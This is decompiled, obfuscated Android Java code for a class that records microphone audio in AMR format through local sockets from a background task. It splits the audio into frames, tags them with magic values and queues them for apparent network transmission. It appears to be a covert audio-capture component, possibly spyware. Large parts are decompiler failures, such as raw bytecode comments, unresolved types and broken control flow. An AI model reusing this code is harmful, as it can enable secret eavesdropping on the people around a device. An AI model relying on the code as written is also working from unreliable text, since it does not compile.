package o;

import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.LinkedBlockingQueue;

public class Channel
  extends ?
  implements MediaRecorder.OnErrorListener, MediaRecorder.OnInfoListener, ?<IF>
{
  private static byte[] ZERO = { 35, 33, 65, 77, 82, 10 };
  private byte[] a = null;
  private InputStream in;
  private long index;
  private MediaRecorder recorder;
  private LocalSocket sender;
  private LocalServerSocket socket;
  private int state;
  private LocalSocket this$0;
  private String thread;
  private int type = 0;
  private boolean wide;
  private int[] y = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
  
  public Channel() {}
  
  /* Error */
  private void close()
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: aload_0
    //   3: getfield 63	o/Channel:recorder	Landroid/media/MediaRecorder;
    //   6: aconst_null
    //   7: invokevirtual 69	android/media/MediaRecorder:setOnErrorListener	(Landroid/media/MediaRecorder$OnErrorListener;)V
    //   10: aload_0
    //   11: getfield 63	o/Channel:recorder	Landroid/media/MediaRecorder;
    //   14: aconst_null
    //   15: invokevirtual 73	android/media/MediaRecorder:setOnInfoListener	(Landroid/media/MediaRecorder$OnInfoListener;)V
    //   18: aload_0
    //   19: getfield 63	o/Channel:recorder	Landroid/media/MediaRecorder;
    //   22: astore_1
    //   23: aload_1
    //   24: invokevirtual 76	android/media/MediaRecorder:stop	()V
    //   27: aload_0
    //   28: getfield 63	o/Channel:recorder	Landroid/media/MediaRecorder;
    //   31: invokevirtual 79	android/media/MediaRecorder:reset	()V
    //   34: aload_0
    //   35: invokespecial 83	o/Channel:start	()[B
    //   38: pop
    //   39: aload_0
    //   40: getfield 85	o/Channel:in	Ljava/io/InputStream;
    //   43: astore_1
    //   44: aload_1
    //   45: invokevirtual 89	java/io/InputStream:close	()V
    //   48: aload_0
    //   49: aconst_null
    //   50: putfield 85	o/Channel:in	Ljava/io/InputStream;
    //   53: aload_0
    //   54: getfield 91	o/Channel:sender	Landroid/net/LocalSocket;
    //   57: astore_1
    //   58: aload_1
    //   59: invokevirtual 94	android/net/LocalSocket:close	()V
    //   62: aload_0
    //   63: getfield 96	o/Channel:this$0	Landroid/net/LocalSocket;
    //   66: astore_1
    //   67: aload_1
    //   68: invokevirtual 94	android/net/LocalSocket:close	()V
    //   71: aload_0
    //   72: getfield 98	o/Channel:socket	Landroid/net/LocalServerSocket;
    //   75: astore_1
    //   76: aload_1
    //   77: invokevirtual 101	android/net/LocalServerSocket:close	()V
    //   80: aload_0
    //   81: getfield 63	o/Channel:recorder	Landroid/media/MediaRecorder;
    //   84: invokevirtual 104	android/media/MediaRecorder:release	()V
    //   87: aload_0
    //   88: aconst_null
    //   89: putfield 63	o/Channel:recorder	Landroid/media/MediaRecorder;
    //   92: aload_0
    //   93: monitorexit
    //   94: return
    //   95: astore_1
    //   96: aload_0
    //   97: monitorexit
    //   98: aload_1
    //   99: athrow
    //   100: astore_1
    //   101: goto -74 -> 27
    //   104: astore_1
    //   105: goto -25 -> 80
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	108	0	this	Channel
    //   22	55	1	localObject	Object
    //   95	4	1	localThrowable	Throwable
    //   100	1	1	localException	Exception
    //   104	1	1	localIOException	IOException
    // Exception table:
    //   from	to	target	type
    //   2	18	95	java/lang/Throwable
    //   23	27	95	java/lang/Throwable
    //   27	44	95	java/lang/Throwable
    //   44	48	95	java/lang/Throwable
    //   48	58	95	java/lang/Throwable
    //   58	62	95	java/lang/Throwable
    //   62	67	95	java/lang/Throwable
    //   67	71	95	java/lang/Throwable
    //   76	80	95	java/lang/Throwable
    //   80	94	95	java/lang/Throwable
    //   23	27	100	java/lang/Exception
    //   44	48	104	java/io/IOException
    //   58	62	104	java/io/IOException
    //   67	71	104	java/io/IOException
    //   76	80	104	java/io/IOException
  }
  
  /* Error */
  public static Channel create()
  {
    // Byte code:
    //   0: invokestatic 112	o/Context:get	()Lo/Context;
    //   3: astore_0
    //   4: goto +9 -> 13
    //   7: astore_0
    //   8: aload_0
    //   9: invokevirtual 116	java/lang/Throwable:getCause	()Ljava/lang/Throwable;
    //   12: athrow
    //   13: ldc 118
    //   15: invokestatic 123	o/Log:get	(Ljava/lang/String;)Ljava/lang/Class;
    //   18: ldc 125
    //   20: iconst_1
    //   21: anewarray 127	java/lang/Class
    //   24: dup
    //   25: iconst_0
    //   26: ldc -127
    //   28: aastore
    //   29: invokevirtual 133	java/lang/Class:getMethod	(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   32: aconst_null
    //   33: iconst_1
    //   34: anewarray 135	java/lang/Object
    //   37: dup
    //   38: iconst_0
    //   39: ldc -119
    //   41: aastore
    //   42: invokevirtual 143	java/lang/reflect/Method:invoke	(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   45: checkcast 129	java/lang/String
    //   48: astore_1
    //   49: aload_0
    //   50: aload_1
    //   51: invokevirtual 148	o/Transaction:get	(Ljava/lang/String;)Lo/HttpConnection;
    //   54: checkcast 2	o/Channel
    //   57: areturn
    // Local variable table:
    //   start	length	slot	name	signature
    //   3	1	0	localContext	Context
    //   7	43	0	localThrowable	Throwable
    //   48	3	1	str	String
    // Exception table:
    //   from	to	target	type
    //   13	49	7	java/lang/Throwable
  }
  
  private void init()
  {
    try
    {
      state = 0;
      a = null;
      index = Connectiontype;
      this$0 = new LocalSocket();
    }
    catch (Throwable localThrowable)
    {
      Object localObject;
      String str;
      label149:
      throw localThrowable;
    }
    try
    {
      localObject = Long.toHexString(Utils.getBytes());
      thread = ((String)localObject);
      localObject = thread;
      localObject = new LocalServerSocket((String)localObject);
      socket = ((LocalServerSocket)localObject);
      localObject = this$0;
      str = thread;
      ((LocalSocket)localObject).connect(new LocalSocketAddress(str));
      localObject = this$0;
      ((LocalSocket)localObject).setReceiveBufferSize(500000);
      localObject = this$0;
      ((LocalSocket)localObject).setSendBufferSize(500000);
      localObject = socket;
      localObject = ((LocalServerSocket)localObject).accept();
      sender = ((LocalSocket)localObject);
      localObject = sender;
      ((LocalSocket)localObject).setReceiveBufferSize(500000);
      localObject = sender;
      ((LocalSocket)localObject).setSendBufferSize(500000);
    }
    catch (IOException localIOException)
    {
      break label149;
    }
    recorder = new MediaRecorder();
    recorder.setOnErrorListener(this);
    recorder.setOnInfoListener(this);
    recorder.setAudioSource(1);
    recorder.setOutputFormat(3);
    recorder.setAudioEncoder(1);
    recorder.setOutputFile(sender.getFileDescriptor());
    recorder.prepare();
    recorder.start();
  }
  
  private byte[] start()
  {
    byte[] arrayOfByte = null;
    InputStream localInputStream = null;
    Object localObject1 = this$0;
    Object localObject2 = arrayOfByte;
    try
    {
      boolean bool = ((LocalSocket)localObject1).isBound();
      localObject1 = localInputStream;
      if (bool)
      {
        localObject1 = this$0;
        localObject2 = arrayOfByte;
        bool = ((LocalSocket)localObject1).isConnected();
        localObject1 = localInputStream;
        if (bool)
        {
          if (in == null)
          {
            localObject1 = this$0;
            localObject2 = arrayOfByte;
            localObject1 = ((LocalSocket)localObject1).getInputStream();
            in = ((InputStream)localObject1);
          }
          localObject1 = in;
          localObject2 = arrayOfByte;
          int i = ((InputStream)localObject1).available();
          arrayOfByte = new byte[i];
          localObject1 = arrayOfByte;
          localInputStream = in;
          localObject2 = localObject1;
          localInputStream.read(arrayOfByte);
        }
      }
      return localObject1;
    }
    catch (IOException localIOException) {}
    return localObject2;
  }
  
  private int write(LogEntry paramLogEntry)
  {
    // Byte code:
    //   0: aload_1
    //   1: getfield 245	o/LogEntry:type	Z
    //   4: ifeq +25 -> 29
    //   7: aload_0
    //   8: invokevirtual 250	o/HttpConnection:encode	()Z
    //   11: ifne +15 -> 26
    //   14: aload_0
    //   15: invokespecial 253	o/HttpConnection:open	()V
    //   18: aload_0
    //   19: invokespecial 255	o/Channel:write	()V
    //   22: aload_0
    //   23: invokespecial 256	o/Channel:close	()V
    //   26: goto +21 -> 47
    //   29: aload_0
    //   30: invokevirtual 250	o/HttpConnection:encode	()Z
    //   33: ifeq +14 -> 47
    //   36: aload_0
    //   37: invokespecial 258	o/Channel:init	()V
    //   40: goto +3 -> 43
    //   43: aload_0
    //   44: invokespecial 260	o/HttpConnection:connect	()V
    //   47: iconst_1
    //   48: ireturn
    //   49: astore_1
    //   50: goto -7 -> 43
    //   53: astore_1
    //   54: goto -11 -> 43
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	57	0	this	Channel
    //   0	57	1	paramLogEntry	LogEntry
    // Exception table:
    //   from	to	target	type
    //   36	40	49	java/lang/IllegalStateException
    //   36	40	53	java/io/IOException
  }
  
  private void write()
  {
    for (;;)
    {
      try
      {
        Object localObject3 = start();
        localObject2 = localObject3;
        if ((localObject3 != null) && (localObject3.length > 0))
        {
          if (Method.equals((byte[])localObject3, ZERO, ZERO.length))
          {
            i = ZERO.length;
            j = localObject3.length - i;
            localObject1 = new byte[j];
            java.lang.System.arraycopy(localObject3, i, localObject1, 0, j);
            break label372;
          }
          localObject1 = localObject2;
          if (a == null) {
            break label372;
          }
          localObject1 = localObject2;
          if (a.length <= 0) {
            break label372;
          }
          localObject2 = a;
          i = a.length;
          int j = localObject3.length;
          localObject1 = new byte[i + j];
          java.lang.System.arraycopy(localObject2, 0, localObject1, 0, i);
          java.lang.System.arraycopy(localObject3, 0, localObject1, i, j);
          break label372;
          int k = y[(localObject1[i] >> 3 & 0xF)];
          j = i + (k + 1);
          i = j;
          if (j < localObject1.length) {
            continue;
          }
          localObject2 = localObject1;
          if (j > localObject1.length + 1)
          {
            i = j - k - 1;
            j = localObject1.length - i;
            localObject2 = new byte[j];
            java.lang.System.arraycopy(localObject1, i, localObject2, 0, j);
            a = ((byte[])localObject2);
            localObject2 = localObject1;
            if (a.length > 0)
            {
              localObject2 = new byte[i];
              java.lang.System.arraycopy(localObject1, 0, localObject2, 0, i);
            }
          }
          if (localObject2.length > 0)
          {
            localObject1 = new byte[16];
            localObject3 = new System((byte[])localObject1, 0, 16);
            this$0.putInt(2008121901);
            this$0.putInt(8001);
            long l = index;
            this$0.putLong(l);
            localObject1 = new Field(49858, (byte[])localObject1, (byte[])localObject2);
            localObject2 = Request.get();
            localObject2 = this$0;
          }
        }
      }
      catch (Throwable localThrowable)
      {
        Object localObject2;
        Object localObject1;
        throw localThrowable;
      }
      try
      {
        ((LinkedBlockingQueue)localObject2).put(localObject1);
        return;
      }
      catch (Exception localException)
      {
        continue;
      }
      return;
      state += 1;
      return;
      label372:
      int i = 0;
    }
  }
  
  public final void connect()
  {
    if (encode())
    {
      try
      {
        init();
      }
      catch (IllegalStateException localIllegalStateException)
      {
        for (;;) {}
      }
      catch (IOException localIOException)
      {
        for (;;) {}
      }
      super.connect();
      return;
    }
  }
  
  public final void doInBackground()
  {
    if (!wide) {}
    try
    {
      ProfileFragment.newInstance().add(this);
      wide = true;
      init();
      return;
    }
    catch (IllegalStateException localIllegalStateException) {}catch (IOException localIOException) {}
  }
  
  public final void execute()
  {
    if (wide)
    {
      ProfileFragment.newInstance().update(this);
      wide = false;
    }
    write();
    close();
  }
  
  public final boolean execute(Integer paramInteger)
  {
    value = 5000L;
    set();
    count = 5000L;
    set();
    return true;
  }
  
  public void onError(MediaRecorder paramMediaRecorder, int paramInt1, int paramInt2)
  {
    close();
  }
  
  public void onInfo(MediaRecorder paramMediaRecorder, int paramInt1, int paramInt2) {}
  
  public final void open()
  {
    if (!encode())
    {
      super.open();
      write();
      close();
    }
  }
  
  public final void read()
  {
    recorder.getMaxAmplitude();
    if (state < 10) {
      write();
    } else {
      flush();
    }
    JSONArray.get();
    if ((JSONArray.write()) && (!encode()))
    {
      super.open();
      write();
      close();
    }
  }
}
